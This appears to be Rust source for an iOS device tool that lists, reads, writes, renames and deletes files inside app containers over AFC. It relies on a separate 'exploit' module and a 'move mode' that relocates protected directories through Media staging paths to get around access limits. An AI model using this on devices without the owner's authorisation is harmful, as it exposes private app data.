            .map_err(|e| format!("afc read: {e:?}"))?;
        if n == 0 {
            break;
        }
        file.write_all(&buf[..n])
            .map_err(|e| format!("local write: {e}"))?;
        total += n as u64;
    }
    file.flush().map_err(|e| format!("local flush: {e}"))?;
    Ok(total)
}

async fn stream_local_to_afc(
    src: &str,
    fd: &mut idevice::afc::file::FileDescriptor<'_>,
) -> Result<u64, String> {
    let mut file = std::fs::File::open(src).map_err(|e| format!("open {src}: {e}"))?;
    let mut buf = vec![0u8; CHUNK];
    let mut total: u64 = 0;
    loop {
        let n = file
            .read(&mut buf)
            .map_err(|e| format!("local read: {e}"))?;
        if n == 0 {
            break;
        }
        fd.write_all(&buf[..n])
            .await
            .map_err(|e| format!("afc write: {e:?}"))?;
        total += n as u64;
    }
    Ok(total)
}

// ---------------------------------------------------------------------------
// FFI: list
// ---------------------------------------------------------------------------

pub unsafe fn fs_list(
    pairing_path: *const c_char,
    bundle_id: *const c_char,
    container_path: *const c_char,
    rel_path: *const c_char,
    bridge: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_json: *mut *mut c_char,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let bundle_id = opt_str(bundle_id, "");
    let container_path = opt_str(container_path, "");
    let rel_path = opt_str(rel_path, "");
    let bridge = opt_str(bridge, "");
    let ctx_usize = ctx as usize;

    if !allowed_container(&container_path) {
        if !out_error.is_null() {
            *out_error = cstr("container_path is not allowed");
        }
        return 1;
    }
    if !safe_rel(&rel_path) {
        if !out_error.is_null() {
            *out_error = cstr("rel_path contains unsafe components");
        }
        return 1;
    }

    let res = crate::ffi_util::run_with_large_stack("al_fs_list", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(fs_list_async(
            pairing_path.clone(),
            bundle_id.clone(),
            container_path.clone(),
            rel_path.clone(),
            bridge.clone(),
            &logger,
        ))
    });

    match res {
        Ok(Ok(s)) => {
            if !out_json.is_null() {
                *out_json = cstr(s);
            }
            0
        }
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(p) => {
            if !out_error.is_null() {
                *out_error = cstr(p);
            }
            1
        }
    }
}

async fn fs_list_async(
    pairing_path: String,
    bundle_id: String,
    container_path: String,
    rel_path: String,
    bridge: String,
    logger: &Logger,
) -> Result<String, String> {
    let (mut tunnel, mut engine) =
        open_engine(&pairing_path, &bundle_id, &container_path, &bridge, logger).await?;

    let mut entries: Vec<serde_json::Value> = Vec::new();

    // Base path the entries are stat'ed through. In move mode this is the Media
    // staging path, because the bridge denies traversal.
    let (names, base) = if engine.direct {
        let afc_path = engine.path(&rel_path);
        let names = engine
            .afc
            .list_dir(&afc_path)
            .await
            .map_err(|e| format!("{e:?}"))?;
        (names, afc_path)
    } else {
        if !risky_moves_allowed() {
            return Err(
                "This container can only be read in AirLift move mode, which temporarily \
                 relocates a directory. Enable \"Allow risky moves\" in Setup to use it."
                    .to_string(),
            );
        }
        // Relocate the directory out to Media, list it, then put it back.
        let token = exploit::random_hex(8);
        let staging = format!("readipa-list-{token}");
        let abs = engine.abs_path(&container_path, &rel_path);
        let dst_back = engine.path(&rel_path);

        move_path(&mut tunnel, &mut engine.afc, &abs, &staging, logger)
            .await
            .map_err(|e| format!("could not relocate the directory for listing: {e}"))?;

        let listed = engine.afc.list_dir(&staging).await;
        let names = match listed {
            Ok(n) => n,
            Err(e) => {
                // Try hard to put it back before reporting.
                let _ =
                    restore_staged_dir(&mut tunnel, &mut engine.afc, &staging, &dst_back, logger)
                        .await;
                return Err(format!("list failed: {e:?}"));
            }
        };

        // Stat every entry while it is still at the staging path.
        for n in &names {
            if n == "." || n == ".." {
                continue;
            }
            let full = format!("{}/{}", staging.trim_end_matches('/'), n);
            match engine.afc.get_file_info(&full).await {
                Ok(info) => entries.push(entry_json(n, &info)),
                Err(_) => entries.push(json!({"name": n, "isDir": false, "size": 0})),
            }
        }

        // Put it back — retried, and verified. Never silent.
        restore_staged_dir(&mut tunnel, &mut engine.afc, &staging, &dst_back, logger)
            .await
            .map_err(|e| {
                format!(
                    "THE DIRECTORY COULD NOT BE RESTORED AUTOMATICALLY: {e}\n\
                     Your data is safe at /var/mobile/Media/{staging} — use Recovery to move it back."
                )
            })?;

        return Ok(serde_json::to_string_pretty(&json!({"entries": entries}))
            .map_err(|e| e.to_string())?);
    };

    for n in names {
        if n == "." || n == ".." {
            continue;
        }
        let full = if base == "/" || base.is_empty() {
            n.clone()
        } else {
            format!("{}/{}", base.trim_end_matches('/'), n)
        };
        match engine.afc.get_file_info(&full).await {
            Ok(info) => entries.push(entry_json(&n, &info)),
            Err(_) => entries.push(json!({"name": n, "isDir": false, "size": 0})),
        }
    }

    Ok(serde_json::to_string_pretty(&json!({"entries": entries})).map_err(|e| e.to_string())?)
}

/// Move a Media-staged item back into its container. `dst` must be the
/// bridge-relative destination (a Media-relative string), never an absolute
/// container path — ATAirlock only accepts destinations below Media.
async fn restore_staged_dir(
    tunnel: &mut AppDeviceTunnel,
    afc: &mut AfcClient,
    staging: &str,
    dst: &str,
    logger: &Logger,
) -> Result<(), String> {
    let mut last = String::new();
    for attempt in 1..=3 {
        match move_path(tunnel, afc, &format!("{MEDIA_ROOT}{staging}"), dst, logger).await {
            Ok(()) => return Ok(()),
            Err(e) => {
                last = e;
                if attempt < 3 {
                    tokio::time::sleep(std::time::Duration::from_secs(2)).await;
                }
            }
        }
    }
    Err(last)
}

// ---------------------------------------------------------------------------
// FFI: stat
// ---------------------------------------------------------------------------

pub unsafe fn fs_stat(
    pairing_path: *const c_char,
    bundle_id: *const c_char,
    container_path: *const c_char,
    rel_path: *const c_char,
    bridge: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_json: *mut *mut c_char,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let bundle_id = opt_str(bundle_id, "");
    let container_path = opt_str(container_path, "");
    let rel_path = opt_str(rel_path, "");
    let bridge = opt_str(bridge, "");
    let ctx_usize = ctx as usize;

    if !allowed_container(&container_path) || !safe_rel(&rel_path) {
        if !out_error.is_null() {
            *out_error = cstr("invalid path");
        }
        return 1;
    }

    let res = crate::ffi_util::run_with_large_stack("al_fs_stat", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(fs_stat_async(
            pairing_path.clone(),
            bundle_id.clone(),
            container_path.clone(),
            rel_path.clone(),
            bridge.clone(),
            &logger,
        ))
    });

    match res {
        Ok(Ok(s)) => {
            if !out_json.is_null() {
                *out_json = cstr(s);
            }
            0
        }
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(p) => {
            if !out_error.is_null() {
                *out_error = cstr(p);
            }
            1
        }
    }
}

async fn fs_stat_async(
    pairing_path: String,
    bundle_id: String,
    container_path: String,
    rel_path: String,
    bridge: String,
    logger: &Logger,
) -> Result<String, String> {
    let (_tunnel, mut engine) =
        open_engine(&pairing_path, &bundle_id, &container_path, &bridge, logger).await?;
    let afc_path = engine.path(&rel_path);
    let info = engine
        .afc
        .get_file_info(&afc_path)
        .await
        .map_err(|e| format!("{e:?}"))?;
    let name = rel_path.rsplit('/').next().unwrap_or(&rel_path);
    Ok(serde_json::to_string_pretty(&entry_json(
        if name.is_empty() {
            &container_path
        } else {
            name
        },
        &info,
    ))
    .map_err(|e| e.to_string())?)
}

// ---------------------------------------------------------------------------
// FFI: read (export to a local file)
// ---------------------------------------------------------------------------

pub unsafe fn fs_read(
    pairing_path: *const c_char,
    bundle_id: *const c_char,
    container_path: *const c_char,
    rel_path: *const c_char,
    bridge: *const c_char,
    dest_local_path: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let bundle_id = opt_str(bundle_id, "");
    let container_path = opt_str(container_path, "");
    let rel_path = opt_str(rel_path, "");
    let bridge = opt_str(bridge, "");
    let dest_local_path = opt_str(dest_local_path, "");
    let ctx_usize = ctx as usize;

    if !allowed_container(&container_path)
        || !safe_rel(&rel_path)
        || rel_path.is_empty()
        || dest_local_path.is_empty()
    {
        if !out_error.is_null() {
            *out_error = cstr("invalid path");
        }
        return 1;
    }

    let res = crate::ffi_util::run_with_large_stack("al_fs_read", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(fs_read_async(
            pairing_path.clone(),
            bundle_id.clone(),
            container_path.clone(),
            rel_path.clone(),
            bridge.clone(),
            dest_local_path.clone(),
            &logger,
        ))
    });

    match res {
        Ok(Ok(())) => 0,
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(p) => {
            if !out_error.is_null() {
                *out_error = cstr(p);
            }
            1
        }
    }
}

async fn fs_read_async(
    pairing_path: String,
    bundle_id: String,
    container_path: String,
    rel_path: String,
    bridge: String,
    dest_local_path: String,
    logger: &Logger,
) -> Result<(), String> {
    let (mut tunnel, mut engine) =
        open_engine(&pairing_path, &bundle_id, &container_path, &bridge, logger).await?;

    if let Some(parent) = std::path::Path::new(&dest_local_path).parent() {
        let _ = std::fs::create_dir_all(parent);
    }

    if engine.direct {
        let afc_path = engine.path(&rel_path);
        let mut fd = engine
            .afc
            .open(&afc_path, AfcFopenMode::RdOnly)
            .await
            .map_err(|e| format!("{e:?}"))?;
        let written = stream_afc_to_local(&mut fd, &dest_local_path).await;
        let _ = fd.close().await;
        written?;
        return Ok(());
    }

    // Move mode: relocate the file out, copy it, then put it back — verified.
    let token = exploit::random_hex(8);
    let staging = format!("readipa-hold-{token}");
    let abs = engine.abs_path(&container_path, &rel_path);
    let dst_back = engine.path(&rel_path);

    move_path(&mut tunnel, &mut engine.afc, &abs, &staging, logger)
        .await
        .map_err(|e| format!("could not relocate the file to read it: {e}"))?;

    let read = async {
        let mut fd = engine
            .afc
            .open(&staging, AfcFopenMode::RdOnly)
            .await
            .map_err(|e| format!("{e:?}"))?;
        let r = stream_afc_to_local(&mut fd, &dest_local_path).await;
        let _ = fd.close().await;
        r.map(|_| ())
    }
    .await;

    if let Err(e) = read {
        // Try to put the file back before reporting the read failure.
        let _ = restore_staged_dir(&mut tunnel, &mut engine.afc, &staging, &dst_back, logger).await;
        return Err(format!("read failed: {e}"));
    }

    restore_staged_dir(&mut tunnel, &mut engine.afc, &staging, &dst_back, logger)
        .await
        .map_err(|e| {
            format!(
                "The file was read but could not be put back: {e}\n\
                 It is safe at /var/mobile/Media/{staging} — use Recovery to move it back."
            )
        })?;
    Ok(())
}

// ---------------------------------------------------------------------------
// FFI: write (import from a local file)
// ---------------------------------------------------------------------------

pub unsafe fn fs_write(
    pairing_path: *const c_char,
    bundle_id: *const c_char,
    container_path: *const c_char,
    rel_path: *const c_char,
    bridge: *const c_char,
    src_local_path: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let bundle_id = opt_str(bundle_id, "");
    let container_path = opt_str(container_path, "");
    let rel_path = opt_str(rel_path, "");
    let bridge = opt_str(bridge, "");
    let src_local_path = opt_str(src_local_path, "");
    let ctx_usize = ctx as usize;

    if !allowed_container(&container_path)
        || !safe_rel(&rel_path)
        || rel_path.is_empty()
        || src_local_path.is_empty()
    {
        if !out_error.is_null() {
            *out_error = cstr("invalid path");
        }
        return 1;
    }

    let res = crate::ffi_util::run_with_large_stack("al_fs_write", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(fs_write_async(
            pairing_path.clone(),
            bundle_id.clone(),
            container_path.clone(),
            rel_path.clone(),
            bridge.clone(),
            src_local_path.clone(),
            &logger,
        ))
    });

    match res {
        Ok(Ok(())) => 0,
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(p) => {
            if !out_error.is_null() {
                *out_error = cstr(p);
            }
            1
        }
    }
}

async fn fs_write_async(
    pairing_path: String,
    bundle_id: String,
    container_path: String,
    rel_path: String,
    bridge: String,
    src_local_path: String,
    logger: &Logger,
) -> Result<(), String> {
    let (mut tunnel, mut engine) =
        open_engine(&pairing_path, &bundle_id, &container_path, &bridge, logger).await?;

    if engine.direct {
        let afc_path = engine.path(&rel_path);
        // Never write a file over an existing directory.
        if let Ok(info) = engine.afc.get_file_info(&afc_path).await {
            if info.st_ifmt.contains("DIR") {
                return Err("A folder already exists at that name".into());
            }
        }
        let mut fd = engine
            .afc
            .open(&afc_path, AfcFopenMode::WrOnly)
            .await
            .map_err(|e| format!("{e:?}"))?;
        let r = stream_local_to_afc(&src_local_path, &mut fd).await;
        let _ = fd.close().await;
        r.map(|_| ())?;
        return Ok(());
    }

    let token = exploit::random_hex(8);
    let pickup = format!("readipa-pickup-{token}");
    let backup = format!("readipa-backup-{token}");
    let abs = engine.abs_path(&container_path, &rel_path);
    let dst_back = engine.path(&rel_path);

    // 1. Stream the new content into Media.
    {
        let mut fd = engine
            .afc
            .open(&pickup, AfcFopenMode::WrOnly)
            .await
            .map_err(|e| format!("{e:?}"))?;
        let r = stream_local_to_afc(&src_local_path, &mut fd).await;
        let _ = fd.close().await;
        if let Err(e) = r {
            let _ = remove_one(&mut engine.afc, &pickup).await;
            return Err(format!("could not stage the new file: {e}"));
        }
    }

    // 2. Move any existing target aside so nothing is destroyed.
    let had_existing = move_path(&mut tunnel, &mut engine.afc, &abs, &backup, logger)
        .await
        .is_ok();

    // 3. Move the staged file into the container.
    let moved = move_path(
        &mut tunnel,
        &mut engine.afc,
        &format!("{MEDIA_ROOT}{pickup}"),
        &dst_back,
        logger,
    )
    .await;

    match moved {
        Ok(()) => {
            if had_existing {
                let _ = remove_tree_safe(&mut engine.afc, &backup).await;
            }
            Ok(())
        }
        Err(e) => {
            // Restore the original so the container is left as we found it.
            let restore = if had_existing {
                match move_path(
                    &mut tunnel,
                    &mut engine.afc,
                    &format!("{MEDIA_ROOT}{backup}"),
                    &dst_back,
                    logger,
                )
                .await
                {
                    Ok(()) => "the previous file was restored".to_string(),
                    Err(re) => format!(
                        "the previous file is safe at /var/mobile/Media/{backup} but could not be \
                         restored automatically ({re}); original path: {abs}"
                    ),
                }
            } else {
                "no previous file existed".to_string()
            };
            let _ = remove_one(&mut engine.afc, &pickup).await;
            Err(format!("write failed: {e} — {restore}"))
        }
    }
}

// ---------------------------------------------------------------------------
// FFI: mkdir
// ---------------------------------------------------------------------------

pub unsafe fn fs_mkdir(
    pairing_path: *const c_char,
    bundle_id: *const c_char,
    container_path: *const c_char,
    rel_path: *const c_char,
    bridge: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let bundle_id = opt_str(bundle_id, "");
    let container_path = opt_str(container_path, "");
    let rel_path = opt_str(rel_path, "");
    let bridge = opt_str(bridge, "");
    let ctx_usize = ctx as usize;

    if !allowed_container(&container_path) || !safe_rel(&rel_path) || rel_path.is_empty() {
        if !out_error.is_null() {
            *out_error = cstr("invalid path");
        }
        return 1;
    }

    let res = crate::ffi_util::run_with_large_stack("al_fs_mkdir", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(fs_mkdir_async(
            pairing_path.clone(),
            bundle_id.clone(),
            container_path.clone(),
            rel_path.clone(),
            bridge.clone(),
            &logger,
        ))
    });

    match res {
        Ok(Ok(())) => 0,
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(p) => {
            if !out_error.is_null() {
                *out_error = cstr(p);
            }
            1
        }
    }
}

async fn fs_mkdir_async(
    pairing_path: String,
    bundle_id: String,
    container_path: String,
    rel_path: String,
    bridge: String,
    logger: &Logger,
) -> Result<(), String> {
    let (mut tunnel, mut engine) =
        open_engine(&pairing_path, &bundle_id, &container_path, &bridge, logger).await?;

    if engine.direct {
        let afc_path = engine.path(&rel_path);
        engine
            .afc
            .mk_dir(&afc_path)
            .await
            .map_err(|e| format!("{e:?}"))?;
        return Ok(());
    }

    let token = exploit::random_hex(8);
    let staging_parent = format!("readipa-mkdir-{token}");
    let leaf = rel_path.rsplit('/').next().unwrap_or(&rel_path).to_string();
    let staging = format!("{staging_parent}/{leaf}");

    engine
        .afc
        .mk_dir(&staging_parent)
        .await
        .map_err(|e| format!("{e:?}"))?;
    engine
        .afc
        .mk_dir(&staging)
        .await
        .map_err(|e| format!("{e:?}"))?;

    let dst = engine.path(&rel_path);
    let result = move_path(
        &mut tunnel,
        &mut engine.afc,
        &format!("{MEDIA_ROOT}{staging}"),
        &dst,
        logger,
    )
    .await;

    let _ = remove_tree_safe(&mut engine.afc, &staging_parent).await;
    result.map_err(|e| format!("could not create the folder: {e}"))
}

// ---------------------------------------------------------------------------
// FFI: remove
// ---------------------------------------------------------------------------

pub unsafe fn fs_remove(
    pairing_path: *const c_char,
    bundle_id: *const c_char,
    container_path: *const c_char,
    rel_path: *const c_char,
    bridge: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let bundle_id = opt_str(bundle_id, "");
    let container_path = opt_str(container_path, "");
    let rel_path = opt_str(rel_path, "");
    let bridge = opt_str(bridge, "");
    let ctx_usize = ctx as usize;

    if !allowed_container(&container_path) || !safe_rel(&rel_path) || rel_path.is_empty() {
        if !out_error.is_null() {
            *out_error = cstr("invalid path");
        }
        return 1;
    }

    let res = crate::ffi_util::run_with_large_stack("al_fs_remove", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(fs_remove_async(
            pairing_path.clone(),
            bundle_id.clone(),
            container_path.clone(),
            rel_path.clone(),
            bridge.clone(),
            &logger,
        ))
    });

    match res {
        Ok(Ok(())) => 0,
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(p) => {
            if !out_error.is_null() {
                *out_error = cstr(p);
            }
            1
        }
    }
}

async fn fs_remove_async(
    pairing_path: String,
    bundle_id: String,
    container_path: String,
    rel_path: String,
    bridge: String,
    logger: &Logger,
) -> Result<(), String> {
    let (mut tunnel, mut engine) =
        open_engine(&pairing_path, &bundle_id, &container_path, &bridge, logger).await?;

    if engine.direct {
        let afc_path = engine.path(&rel_path);
        // Symlink-safe recursive delete.
        return remove_tree_safe(&mut engine.afc, &afc_path).await;
    }

    // Move out to a Media dump, then delete it there (symlink-safe).
    let token = exploit::random_hex(8);
    let dump = format!("readipa-dump-{token}");
    let abs = engine.abs_path(&container_path, &rel_path);
    move_path(&mut tunnel, &mut engine.afc, &abs, &dump, logger)
        .await
        .map_err(|e| format!("could not move the item out for deletion: {e}"))?;
    remove_tree_safe(&mut engine.afc, &dump).await
}

// ---------------------------------------------------------------------------
// FFI: rename / move
// ---------------------------------------------------------------------------

pub unsafe fn fs_rename(
    pairing_path: *const c_char,
    bundle_id: *const c_char,
    container_path: *const c_char,
    old_rel: *const c_char,
    new_rel: *const c_char,
    bridge: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let bundle_id = opt_str(bundle_id, "");
    let container_path = opt_str(container_path, "");
    let old_rel = opt_str(old_rel, "");
    let new_rel = opt_str(new_rel, "");
    let bridge = opt_str(bridge, "");
    let ctx_usize = ctx as usize;

    if !allowed_container(&container_path)
        || !safe_rel(&old_rel)
        || !safe_rel(&new_rel)
        || old_rel.is_empty()
        || new_rel.is_empty()
    {
        if !out_error.is_null() {
            *out_error = cstr("invalid path");
        }
        return 1;
    }

    let res = crate::ffi_util::run_with_large_stack("al_fs_rename", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(fs_rename_async(
            pairing_path.clone(),
            bundle_id.clone(),
            container_path.clone(),
            old_rel.clone(),
            new_rel.clone(),
            bridge.clone(),
            &logger,
        ))
    });

    match res {
        Ok(Ok(())) => 0,
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(p) => {
            if !out_error.is_null() {
                *out_error = cstr(p);
            }
            1
        }
    }
}

async fn fs_rename_async(
    pairing_path: String,
    bundle_id: String,
    container_path: String,
    old_rel: String,
    new_rel: String,
    bridge: String,
    logger: &Logger,
) -> Result<(), String> {
    let (mut tunnel, mut engine) =
        open_engine(&pairing_path, &bundle_id, &container_path, &bridge, logger).await?;

    if engine.direct {
        let old_path = engine.path(&old_rel);
        let new_path = engine.path(&new_rel);
        // Refuse to overwrite: silently destroying the destination would be data loss.
        if engine.afc.get_file_info(&new_path).await.is_ok() {
            return Err("A file or folder with that name already exists".into());
        }
        engine
            .afc
            .rename(&old_path, &new_path)
            .await
            .map_err(|e| format!("{e:?}"))?;
        return Ok(());
    }

    let token = exploit::random_hex(8);
    let hold = format!("readipa-hold-{token}");
    let old_abs = engine.abs_path(&container_path, &old_rel);
    let new_dst = engine.path(&new_rel);
    let old_dst = engine.path(&old_rel);

    move_path(&mut tunnel, &mut engine.afc, &old_abs, &hold, logger)
        .await
        .map_err(|e| format!("could not relocate the item to rename it: {e}"))?;

    let moved = move_path(
        &mut tunnel,
        &mut engine.afc,
        &format!("{MEDIA_ROOT}{hold}"),
        &new_dst,
        logger,
    )
    .await;

    match moved {
        Ok(()) => Ok(()),
        Err(e) => {
            // Put it back under its original name.
            let restored = move_path(
                &mut tunnel,
                &mut engine.afc,
                &format!("{MEDIA_ROOT}{hold}"),
                &old_dst,
                logger,
            )
            .await;
            match restored {
                Ok(()) => Err(format!("rename failed: {e} — the original name was restored")),
                Err(re) => Err(format!(
                    "rename failed: {e}; the item is safe at /var/mobile/Media/{hold} but could not \
                     be restored automatically ({re})"
                )),
            }
        }
    }
}

// ---------------------------------------------------------------------------
// FFI: recovery — inspect / restore Media leftovers
// ---------------------------------------------------------------------------

pub unsafe fn media_leftovers(
    pairing_path: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_json: *mut *mut c_char,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let ctx_usize = ctx as usize;

    let res = crate::ffi_util::run_with_large_stack("al_media_leftovers", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(media_leftovers_async(pairing_path.clone(), &logger))
    });

    match res {
        Ok(Ok(s)) => {
            if !out_json.is_null() {
                *out_json = cstr(s);
            }
            0
        }
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(p) => {
            if !out_error.is_null() {
                *out_error = cstr(p);
            }
            1
        }
    }
}

async fn media_leftovers_async(pairing_path: String, logger: &Logger) -> Result<String, String> {
    let pairing_bytes = read_pairing(&pairing_path)?;
    let mut tunnel = exploit::connect_tunnel(&pairing_bytes, logger).await?;
    let mut afc = tunnel.connect_afc(logger).await?;

    let names = media_list_root(&mut afc).await?;
    let mut entries: Vec<serde_json::Value> = Vec::new();
    for n in names {
        if !(n.starts_with("readipa-") || n.starts_with("airlift-")) {
            continue;
        }
        match afc.get_file_info(&n).await {
            Ok(info) => entries.push(entry_json(&n, &info)),
            Err(_) => continue,
        }
    }
    Ok(serde_json::to_string_pretty(&json!({ "entries": entries })).map_err(|e| e.to_string())?)
}

pub unsafe fn recover_leftover(
    pairing_path: *const c_char,
    leftover_name: *const c_char,
    container_path: *const c_char,
    rel_path: *const c_char,
    bridge: *const c_char,
    log_cb: exploit::ALLogCallback,
    ctx: *mut c_void,
    out_error: *mut *mut c_char,
) -> i32 {
    let pairing_path = opt_str(pairing_path, "airlift_pairing.plist");
    let leftover_name = opt_str(leftover_name, "");
    let container_path = opt_str(container_path, "");
    let rel_path = opt_str(rel_path, "");
    let bridge = opt_str(bridge, "");
    let ctx_usize = ctx as usize;

    if !safe_media_name(&leftover_name)
        || !allowed_container(&container_path)
        || !safe_rel(&rel_path)
        || rel_path.is_empty()
    {
        if !out_error.is_null() {
            *out_error = cstr("invalid recovery request");
        }
        return 1;
    }

    let res = crate::ffi_util::run_with_large_stack("al_recover_leftover", move || {
        let logger = Logger {
            cb: log_cb,
            ctx: ctx_usize as *mut c_void,
        };
        idevice_ffi::run_sync_local(recover_leftover_async(
            pairing_path.clone(),
            leftover_name.clone(),
            container_path.clone(),
            rel_path.clone(),
            bridge.clone(),
            &logger,
        ))
    });

    match res {
        Ok(Ok(())) => 0,
        Ok(Err(e)) => {
            if !out_error.is_null() {
                *out_error = cstr(e);
            }
            1
        }
        Err(p) => {
            if !out_error.is_null() {
                *out_error = cstr(p);
            }
            1
        }
    }
}

async fn recover_leftover_async(
    pairing_path: String,
    leftover_name: String,
    container_path: String,
    rel_path: String,
    bridge: String,
    logger: &Logger,
) -> Result<(), String> {
    let (mut tunnel, mut engine) =
        open_engine(&pairing_path, "", &container_path, &bridge, logger).await?;
    let dst = engine.path(&rel_path);
    if engine.afc.get_file_info(&dst).await.is_ok() {
        return Err("A file or folder with that name already exists at the destination".into());
    }
    move_path(
        &mut tunnel,
        &mut engine.afc,
        &format!("{MEDIA_ROOT}{leftover_name}"),
        &dst,
        logger,
    )
    .await
    .map_err(|e| format!("could not move the leftover back: {e}"))
}
